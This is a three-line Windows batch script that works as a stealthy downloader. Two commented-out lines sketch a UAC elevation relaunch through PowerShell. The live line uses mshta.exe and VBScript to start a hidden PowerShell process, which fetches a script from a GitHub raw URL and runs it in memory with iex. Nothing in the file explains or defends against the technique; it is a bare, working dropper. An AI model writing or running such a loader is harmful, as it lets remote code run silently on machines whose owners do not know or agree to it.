REM net session >nul 2>&1
REM if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%~f0'" & exit /b 0)
mshta.exe vbscript:CreateObject("WScript.Shell").Run("powershell -command ""iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1') | iex""",0)(window.close)
